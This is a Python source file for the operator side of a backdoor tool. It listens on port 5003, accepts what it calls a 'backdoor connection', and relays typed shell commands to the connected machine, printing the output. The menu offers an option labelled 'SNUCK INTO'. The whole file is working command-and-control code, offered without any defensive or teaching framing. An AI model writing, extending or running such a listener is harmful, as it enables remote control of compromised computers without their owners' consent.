import socket
import time
import sys
import os

from banner import *





def create_socket(): # Inizialize the socket
    
    try:
        global SERVER_HOST
        global SERVER_PORT
        global BUFFER_SIZE
        global s

        SERVER_HOST = '0.0.0.0' # Server IP
        SERVER_PORT = 5003      # Server Port
        BUFFER_SIZE = 1024      # Buffer Size

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as e :
        cprint(" Socket creation failed: ", 'red' +str(e))
    

def socket_bind(): # Socket binding
    

    try:
        
        global SERVER_HOST
        global SERVER_PORT
        global s


        s.bind((SERVER_HOST, SERVER_PORT))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(" [+] Listening for connections on port : " + str(SERVER_PORT) + "\n")

    except socket.error as e :
                cprint(" Socket binding failed: ", 'red' + str(e)+"\nRetrying...", 'red')
                time.sleep(3)
                socket_bind()




def accept_conn(): # Accept backdoor connection

    client_conn, client_addr = s.accept()
    
    print(" [+] Connection has been established | " + "IP: " + client_addr[0] + " | Port: " + str(client_addr[1] ) + "\n")
    send_commands(client_conn)


def send_commands(client_conn): # Send commands
    init()

    while True:
    
        command = input(Fore.RED + " ")
    

        if command == "quit":
            client_conn.close()
            s.close()        
            os.system('cls')
            mainmenu()
            break
        if len(str.encode(command)) > 0:
            
            client_conn.send(str.encode(command))
            results = str(client_conn.recv(BUFFER_SIZE), "utf-8")

            print(results, end="")
            
    
    
           

def main():
    create_socket()
    socket_bind()
    accept_conn()






def mainmenu():
    init()

    os.system('cls')
    banner()
    cprint(" [1] SNUCK INTO\n", 'red')  
    cprint(" [2] HELP\n", 'red')
    cprint(" [3] QUIT\n", 'red')

    opt = input(Fore.RED + " : ")

    if opt == '1':
        os.system('cls')
        banner()
        main()

    elif opt == '2':
        os.system('cls')
        banner()
        cprint(" -- WHILE YOU ARE IN SHELL THESE ARE THE COMMANDS --\n", 'red')
        cprint(" quit - Close connection and go back to main menu\n", 'red')
        
        bacon = input(Fore.RED + " Press 1 to go back main menu : ")
        if bacon == '1':
            os.system('cls')
            mainmenu()

    elif opt == '3':

        os.system('cls')
        sys.exit(0)



mainmenu()